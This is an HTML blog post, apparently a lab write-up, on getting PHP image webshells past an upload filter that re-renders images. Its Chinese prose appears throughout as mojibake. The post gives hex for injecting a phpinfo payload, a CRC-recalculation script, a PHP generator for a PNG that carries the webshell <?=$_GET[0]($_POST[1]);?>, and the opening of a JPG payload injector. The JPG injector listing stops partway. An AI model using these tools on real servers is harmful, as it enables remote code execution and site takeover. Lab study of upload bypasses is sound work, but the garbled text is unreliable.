&lt;p&gt;â€‹ é¦–å…ˆæ˜¯åˆ†æä¸€æ³¢æºç ï¼š&lt;/p&gt;
&lt;p&gt;â€‹ ä»¥jpgæ–‡ä»¶åˆ¤å®šä¸ºä¾‹ã€‚è·å–æ–‡ä»¶åã€ç±»å‹ã€ä¸´æ—¶æ–‡ä»¶è·¯å¾„ï¼Œè·å–æ–‡ä»¶åç¼€ï¼Œè¿›å…¥jpgå›¾ç‰‡åˆ¤å®šï¼Œåˆ¤å®šçš„æ–¹å¼æ˜¯é€šè¿‡æ–‡ä»¶åç¼€å’Œæ–‡ä»¶çš„ç±»å‹åˆ¤å®šï¼Œå†æ‰§è¡Œ&lt;code&gt;move_uploaded_file&lt;/code&gt;å‡½æ•°å…ˆæŠŠæ–‡ä»¶ç§»åŠ¨åˆ°&lt;code&gt;upload&lt;/code&gt;æ–‡ä»¶å¤¹ï¼Œç°åœ¨æ–‡ä»¶è·¯å¾„æ˜¯&lt;code&gt;$target_path&lt;/code&gt;ï¼Œä¹‹åå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ äºŒæ¬¡æ¸²æŸ“ç”¨åˆ°äº†&lt;code&gt;imagecreatefromjpeg&lt;/code&gt;å‡½æ•°ï¼Œå®˜æ–¹è§£é‡Šï¼šç”±æ–‡ä»¶æˆ– URL åˆ›å»ºä¸€ä¸ªæ–°å›¾è±¡ï¼Œè¿”å›ä¸€å›¾åƒæ ‡è¯†ç¬¦ï¼Œä»£è¡¨äº†ä»ç»™å®šçš„æ–‡ä»¶åå–å¾—çš„å›¾åƒï¼ˆè¿™æ—¶å€™å›¾åƒå¯¹è±¡è¿˜æ˜¯ä¸€ä¸ªç©ºçš„ï¼‰ã€‚ç„¶ååˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå¦‚æœä¸æ˜¯çš„è¯æ‰§è¡Œ&lt;code&gt;unlink&lt;/code&gt;å‡½æ•°åˆ é™¤æ–‡ä»¶ï¼Œå¦åˆ™ï¼Œä¸ºæ–°å›¾ç‰‡éšæœºä¸€ä¸ªåç§°ï¼Œæ‰§è¡Œ&lt;code&gt;imagejpeg&lt;/code&gt;å‡½æ•°æŠŠå›¾è±¡è¾“å‡ºåˆ°æ–°æ–‡ä»¶&lt;code&gt; $newfilename&lt;/code&gt;ã€‚å†å°†ä¹‹å‰ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶&lt;code&gt;$target_path&lt;/code&gt;åˆ é™¤æ‰ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ æ ¹æ®ä¸Šé¢çš„åˆ†æå°±èƒ½å¾—å‡ºæ¥ä¸¤ç§æ€è·¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;è®¿é—®äºŒæ¬¡æ¸²æŸ“ä¹‹å‰çš„ä¸Šä¼ çš„æ–‡ä»¶ã€‚&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;åœ¨å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä»¥åå›¾ç‰‡é©¬æœªå¤±æ•ˆã€‚&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="ç¬¬ä¸€ç§æ–¹æ³•"&gt;ç¬¬ä¸€ç§æ–¹æ³•
&lt;/h2&gt;&lt;p&gt;â€‹ ï¼ˆLinuxç¯å¢ƒã€phpç‰ˆæœ¬7.2.21ï¼‰&lt;/p&gt;
&lt;p&gt;â€‹ å› ä¸ºäºŒæ¬¡æ¸²æŸ“é‚£éƒ¨åˆ†&lt;code&gt;ifã€else&lt;/code&gt;æ— è®ºå¦‚ä½•éƒ½ä¼šæ‰§è¡Œ&lt;code&gt;unlink&lt;/code&gt;å‡½æ•°åˆ é™¤ä½ çš„æ–‡ä»¶ï¼Œéœ€è¦åœ¨æ‰§è¡Œ&lt;code&gt;imagecreatefromjpeg&lt;/code&gt;æ—¶æŠ¥é”™æ‰èƒ½è®¿é—®åˆ°è‡ªå·±åŸæ¥ä¸Šä¼ çš„æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;h3 id="jpgæ ¼å¼"&gt;jpgæ ¼å¼
&lt;/h3&gt;&lt;h4 id="å‡†å¤‡å¹¶ä¸Šä¼ "&gt;å‡†å¤‡å¹¶ä¸Šä¼ 
&lt;/h4&gt;&lt;p&gt;â€‹ éœ€è¦å‡†å¤‡åªå«æœ‰ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶å¹¶å‘½åä¸º.jpgæ ¼å¼ã€‚ç›´æ¥ä¸Šä¼ ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h4 id="æ–‡ä»¶åŒ…å«éªŒè¯"&gt;æ–‡ä»¶åŒ…å«éªŒè¯
&lt;/h4&gt;&lt;p&gt;â€‹ ä¸Šä¼ ä»¥åæˆ‘ä½¿ç”¨çš„åœ¨çº¿é¶åœºç½‘é¡µä¸­é¢˜ç›®éƒ¨åˆ†ç›´æ¥æ¶ˆå¤±äº†ï¼Œè¿™å°±è¯´æ˜å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºé”™å¯¼è‡´é¡µé¢ä¹Ÿæ²¡æœ‰æ­£å¸¸è¿”å›ã€‚ç„¶åå°±å¯ä»¥ä½¿ç”¨&lt;code&gt;inclue.php&lt;/code&gt;æ–‡ä»¶åŒ…å«è®¿é—®åˆšåˆšä¸Šä¼ çš„æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h3 id="å…¶ä»–æ ¼å¼"&gt;å…¶ä»–æ ¼å¼
&lt;/h3&gt;&lt;p&gt;â€‹ å¦‚å›¾æˆåŠŸè®¿é—®å°±æ˜¯å›¾ç‰‡é©¬ä¸Šä¼ æˆåŠŸäº†ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•æˆ‘åªæœ‰&lt;code&gt;jpg&lt;/code&gt;æ ¼å¼çš„æ–‡ä»¶ä¸Šä¼ æˆåŠŸäº†ï¼Œå¦å¤–ä¸¤ç§æ ¼å¼çš„å›¾ç‰‡æ²¡æœ‰ä¸Šä¼ æˆåŠŸï¼Œè¿™ä¸ªæˆ‘æ„Ÿè§‰éœ€è¦äº†è§£&lt;code&gt;imagecreatefromjpeg&lt;/code&gt;ã€&lt;code&gt;imagecreatefrompng&lt;/code&gt;ã€&lt;code&gt;imagecreatefromgif&lt;/code&gt;ï¼Œè¿™ä¸‰ä¸ªå‡½æ•°çš„åŸç†ï¼Œè®©å…¶æŠ¥é”™å³å¯ã€‚&lt;/p&gt;
&lt;h2 id="ç¬¬äºŒç§æ–¹æ³•"&gt;ç¬¬äºŒç§æ–¹æ³•
&lt;/h2&gt;&lt;p&gt;â€‹ ï¼ˆwindowsç¯å¢ƒï¼Œphpç‰ˆæœ¬5.2.17ï¼‰&lt;/p&gt;
&lt;p&gt;â€‹ è¿™ç§æ–¹æ³•æ˜¯è®©å›¾ç‰‡ç åœ¨ç»è¿‡äºŒæ¬¡æ¸²æŸ“ä»¥åï¼Œèƒ½ä¿è¯ä»£ç ä¸ä¼šè¢«äºŒæ¬¡æ¸²æŸ“ç»™è¿‡æ»¤æ‰ã€‚ä»æœ€ç®€å•çš„ä¸€ä¸ªä¸€ä¸ªæ¥ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ ç”¨åˆ°çš„å·¥å…·æ˜¯&lt;strong&gt;Beyond Compare 4&lt;/strong&gt;ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶æ¯”è¾ƒçš„å·¥å…·ï¼Œå°±æ˜¯æŸ¥çœ‹å›¾ç‰‡æ¸²æŸ“ä¿®æ”¹çš„å“ªäº›éƒ¨åˆ†ï¼Œè¿˜å¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„16è¿›åˆ¶æ ¼å¼ã€‚&lt;/p&gt;
&lt;h3 id="gifæ ¼å¼"&gt;GIFæ ¼å¼
&lt;/h3&gt;&lt;h4 id="å‡†å¤‡å¹¶ä¸Šä¼ -1"&gt;å‡†å¤‡å¹¶ä¸Šä¼ 
&lt;/h4&gt;&lt;p&gt;â€‹ ä¸Šä¼ ä¸€ä¸ªä½¿ç”¨&lt;code&gt;copy /b&lt;/code&gt;æŒ‡ä»¤åˆ¶ä½œçš„å›¾ç‰‡é©¬ï¼Œä¹‹å‰æ–‡ç« ç¬¬13é¢˜ç”¨è¿‡ã€‚å‡è®¾ä¸Šä¼ çš„å›¾ç‰‡é©¬ä¸º&lt;strong&gt;yoo.gif&lt;/strong&gt;ï¼Œä¸Šä¼ æˆåŠŸä»¥åå†ä¸‹è½½ä¸‹è½½çš„æ–‡ä»¶åä¸º&lt;strong&gt;2119840023.gif&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h4 id="æ–‡ä»¶æ¯”è¾ƒ"&gt;æ–‡ä»¶æ¯”è¾ƒ
&lt;/h4&gt;&lt;p&gt;â€‹ ä½¿ç”¨å‰é¢è¯´çš„&lt;strong&gt;Beyond Compare 4&lt;/strong&gt;å·¥å…·è¿›è¡Œæ¯”è¾ƒï¼Œå·¦è¾¹æ˜¯æ¸²æŸ“å‰çš„æ–‡ä»¶ï¼Œå³è¾¹æ˜¯æ¸²æŸ“åçš„æ–‡ä»¶ï¼Œå›¾ç‰‡ä¸­ç™½è‰²çš„åœ°æ–¹å°±æ˜¯ä¸¤ä¸ªæ–‡ä»¶&lt;strong&gt;ç›¸åŒ&lt;/strong&gt;çš„åœ°æ–¹ï¼Œçº¢è‰²éƒ¨åˆ†åˆ™æ˜¯æ–‡ä»¶ä¸åŒçš„åœ°æ–¹ã€‚çœ‹çš„å‡ºæ¥å›¾ç‰‡æ–‡ä»¶çš„å‰é¢ä¸€å¤§éƒ¨åˆ†äºŒæ¬¡æ¸²æŸ“çš„æ—¶å€™éƒ½æ²¡æœ‰æ”¹å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†ä»£ç æ”¾åœ¨è¿™ä¸€éƒ¨åˆ†é€ƒè¿‡äºŒæ¬¡æ¸²æŸ“ã€‚&lt;code&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/code&gt;çš„åå…­è¿›åˆ¶æ˜¯&lt;code&gt;3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E&lt;/code&gt;ç›´æ¥ç²˜è´´æ’å…¥ï¼Œåœ¨å³è¾¹æ¡†ä¸­å³é”®ä¿å­˜æ–‡ä»¶å†è¿›è¡Œä¸Šä¼ ã€‚&lt;/p&gt;
&lt;h4 id="æ–‡ä»¶åŒ…å«éªŒè¯-1"&gt;æ–‡ä»¶åŒ…å«éªŒè¯
&lt;/h4&gt;&lt;p&gt;â€‹ ä¸Šä¼ ä»¥åè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œä»£ç æ‰§è¡ŒæˆåŠŸã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ ä¸ºäº†éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åˆšåˆšæŠŠä¸Šä¼ çš„å›¾ç‰‡å†ä¸‹è½½ä¸‹è½½ï¼ŒæŸ¥çœ‹æ’å…¥çš„ä»£ç æ˜¯å¦é€ƒè¿‡äº†äºŒæ¬¡æ¸²æŸ“ï¼ˆåºŸè¯æ‰§è¡ŒæˆåŠŸäº†ä»£ç è‚¯å®šåœ¨ï¼‰ã€‚&lt;/p&gt;
&lt;h3 id="pngæ ¼å¼"&gt;pngæ ¼å¼
&lt;/h3&gt;&lt;p&gt;â€‹ è¿™é¢˜è‡ªå·±åŸæ¥æ‰“ç®—æ¨¡ä»¿gifçš„æ–¹æ³•ä¿®æ”¹å›¾ç‰‡ï¼Œä½†æ˜¯ä¸Šä¼ ä»¥åä¸‹è½½ï¼Œå¯¹æ¯”æ–‡ä»¶åå…­è¿›åˆ¶ä¸åŒçš„æ—¶å€™æˆ‘å‚»äº†&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ è¿™ä¸åŒè¿˜æ˜¯ä¸€æ®µä¸€æ®µçš„ï¼Œæ ¹æœ¬ä¸å¯èƒ½æ¨¡ä»¿gifçš„æ–¹æ³•ï¼Œä¸Šé¢é‚£ä¸€æ®µç›¸åŒçš„è¿˜æ˜¯å›¾ç‰‡çš„&lt;strong&gt;å¤´æ ‡è¯†&lt;/strong&gt;éƒ¨åˆ†ï¼Œä¿®æ”¹çš„è¯å°±ä¸æ˜¯pngæ ¼å¼å›¾ç‰‡ï¼Œæ›´è¿‡ä¸äº†ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ æ‰€ä»¥æˆ‘ç›´æ¥çœ‹ç­”æ¡ˆäº†ï¼Œè¿˜æ˜¯å‰è¨€é‡Œçš„&lt;a class="link" href="https://xz.aliyun.com/t/2657#toc-3" target="_blank" rel="noopener"
&gt;åšå®¢&lt;/a&gt;ã€‚pngå›¾ç‰‡ç”±3ä¸ªä»¥ä¸Šçš„æ•°æ®å—ç»„æˆï¼Œç„¶ååˆåˆ†äº†å›¾ç‰‡åŸºæœ¬ä¿¡æ¯ã€å®é™…æ•°æ®å—ã€è¾…åŠ©æ•°æ®å—blablablablï¼Œè€Œä¸”æ•°æ®å—ä¸­è¿˜æœ‰CRCç ï¼Œå­¦è¿‡è®¡ç®—æœºç½‘ç»œçš„éƒ½çŸ¥é“CRCç æ˜¯éªŒè¯é”™è¯¯çš„ï¼Œè‡ªå·±éšä¾¿æ’å…¥ä»£ç ä»¥åä¸ä¿®æ”¹CRCç è‚¯å®šæ˜¯è¿‡ä¸äº†çš„ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ æ‰€ä»¥åˆå‡ºæ¥äº†ä¸¤ç§æ–¹æ³•ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¿®æ”¹CRCç &lt;/li&gt;
&lt;li&gt;ç›´æ¥ç”Ÿæˆå›¾ç‰‡&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id="è®¡ç®—crcç "&gt;è®¡ç®—CRCç 
&lt;/h4&gt;&lt;p&gt;â€‹ è®¡ç®—CRCç çš„&lt;code&gt;python&lt;/code&gt;è„šæœ¬&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;import binascii
import re
png = open(r&amp;#39;1.png&amp;#39;,&amp;#39;rb&amp;#39;)
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)
&amp;#39;&amp;#39;&amp;#39; PLTE crc &amp;#39;&amp;#39;&amp;#39;
data = &amp;#39;504c5445&amp;#39;+ re.findall(&amp;#39;504c5445(.*?)49444154&amp;#39;,hexstr)[0]
crc = binascii.crc32(data[:-16].decode(&amp;#39;hex&amp;#39;)) &amp;amp; 0xffffffff
print hex(crc)
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id="å‡†å¤‡"&gt;å‡†å¤‡
&lt;/h5&gt;&lt;p&gt;â€‹ phpåº•å±‚åœ¨å¯¹PLTEæ•°æ®å—éªŒè¯çš„æ—¶å€™,ä¸»è¦è¿›è¡Œäº†CRCæ ¡éªŒ.æ‰€ä»¥å¯ä»¥åœ¨è¯¥éƒ¨åˆ†&lt;strong&gt;å†™å…¥ä»£ç &lt;/strong&gt;ï¼Œå†é‡æ–°è®¡ç®—CRCç ï¼Œå†ä¿®æ”¹åŸæ¥çš„CRCç å³å¯ã€‚&lt;/p&gt;
&lt;h5 id="è®¡ç®—crcç -1"&gt;è®¡ç®—CRCç 
&lt;/h5&gt;&lt;p&gt;â€‹ è„šæœ¬ä¼šæ‰“å¼€åä¸º1.pngçš„æ–‡ä»¶ç„¶åè¾“å‡ºè®¡ç®—ä»¥åçš„CRCç ç»“æœã€‚åœ¨æŠŠç»“æœè¦†ç›–åŸæ¥çš„CRCç ä¸Šä¼ å›¾ç‰‡å°±ä¸ä¼šå‡ºé”™äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ–¹æ³•æˆ‘æ²¡æœ‰å°è¯•ï¼Œå› ä¸ºæˆ‘ä¸ä¼špythonã€‚&lt;del&gt;éƒ½2020å¹´äº†è¿˜æœ‰äººä¸ä¼špythonï¼Œä¸ä¼šå§ä¸ä¼šå§&lt;/del&gt;ã€‚ğŸ˜’&lt;/p&gt;
&lt;p&gt;ç­‰æˆ‘å­¦ä¼šåœ¨å›æ¥æ”¹è¿™ä¸€ç¯‡å§ã€‚&lt;/p&gt;
&lt;h4 id="ç›´æ¥ç”Ÿæˆå›¾ç‰‡å†™å…¥å®é™…æ•°æ®æ¨¡å—"&gt;ç›´æ¥ç”Ÿæˆå›¾ç‰‡ï¼ˆå†™å…¥å®é™…æ•°æ®æ¨¡å—ï¼‰
&lt;/h4&gt;&lt;p&gt;â€‹ å›½å¤–å¤§ç‰›çš„è„šæœ¬ï¼Œç›´æ¥è¿è¡Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå›¾ç‰‡&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y &amp;lt; sizeof($p); $y += 3) {
$r = $p[$y];
$g = $p[$y+1];
$b = $p[$y+2];
$color = imagecolorallocate($img, $r, $g, $b);
imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,&amp;#39;./1.png&amp;#39;);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;â€‹ phpæŒ‡ä»¤æ€ä¹ˆæ‰§è¡Œï¼Ÿå¦‚æœä½ æœ¬æœºæœ‰phpç¯å¢ƒï¼Œå¯ä»¥åœ¨phpçš„æ ¹ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ªåä¸º&lt;code&gt;php.exe&lt;/code&gt;çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒæ˜¯phpæä¾›çš„ä¸€ç§&lt;strong&gt;CLI&lt;/strong&gt;æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯&lt;strong&gt;å‘½ä»¤è¡Œæ¨¡å¼&lt;/strong&gt;ã€‚æˆ‘æŠŠphpè„šæœ¬æ”¾åœ¨äº†phpçš„æ ¹ç›®å½•ï¼Œç„¶åcmdåˆ‡æ¢åˆ°å¯¹åº”ç›®å½•æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;â€‹ è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯å€Ÿç”¨æœ¬åœ°æ­å»ºçš„é¶æœºç¯å¢ƒï¼ŒæŠŠphpæ”¾åœ¨ç›®å½•ä½¿ç”¨æµè§ˆå™¨è®¿é—®ä¸€ä¸‹å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ è¿è¡ŒæˆåŠŸä»¥åä¼šæ‰¾åˆ°ä¸€ä¸ªåä¸º&lt;strong&gt;1.png&lt;/strong&gt;çš„å›¾ç‰‡ã€‚è¿™ä¸ªå°±æ˜¯ç”Ÿæˆçš„å›¾ç‰‡é©¬äº†ã€‚å¯ä»¥å°è¯•ä¸Šä¼ è¿›è¡Œæ¸²æŸ“ä»¥åä¸‹è½½åˆ°æœ¬åœ°ï¼Œä½¿ç”¨æ–‡ä»¶æ¯”è¾ƒéªŒè¯ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ ä½†æ˜¯è¿™ä¸ªç”Ÿæˆçš„å›¾ç‰‡phpä»£ç æ˜¯&lt;code&gt;&amp;lt;?=$_GET[0]($_POST[1]);?&amp;gt;&lt;/code&gt;ï¼Œåº”è¯¥æ˜¯ä¸ªä¸€å¥è¯æœ¨é©¬ä½†æ˜¯ç°åœ¨çš„æˆ‘è¿˜ä¸ä¼šç”¨ã€‚æºç ä¹Ÿä¸çŸ¥é“æ€ä¹ˆä¿®æ”¹ï¼Œæ€»ä¹‹å›¾ç‰‡æ¸²æŸ“ä»¥åä»£ç æ²¡æœ‰è¢«å»æ‰å°±ç®—æˆåŠŸäº†å§ï¼Œ&lt;del&gt;åº”è¯¥ç®—å§&lt;/del&gt;&lt;/p&gt;
&lt;h3 id="jpgæ ¼å¼-1"&gt;jpgæ ¼å¼
&lt;/h3&gt;&lt;p&gt;â€‹ åŒæ ·çœ‹ç­”æ¡ˆã€‚å›½å¤–å¤§ç‰›å†™çš„è„šæœ¬jpg_payload.phpï¼Œå¯ä»¥å‘jpgå›¾ç‰‡é‡Œå†™å…¥ä»£ç &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; It is necessary that the size and quality of the initial image are the same as those of the processed image.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; 1) Upload an arbitrary image via secured files upload script
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; 2) Save the processed image and launch:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; jpg_payload.php &amp;lt;jpg_name.jpg&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; Since the most straightforward injection method is used, the following problems can occur:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; 1) After the second processing the injected data may become partially corrupted.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; 2) The jpg_payload.php script outputs &amp;#34;Something&amp;#39;s wrong&amp;#34;.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; Sergey Bobrov @Black2Fan.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; See also:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $miniPayload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;lt;?=phpinfo();?&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;extension_loaded&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;gd&amp;#39;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;function_exists&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;imagecreatefromjpeg&amp;#39;&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;php-gd is not installed&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;php jpg_payload.php &amp;lt;jpg_name.jpg&amp;gt;&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;set_error_handler&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;custom_error_handler&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
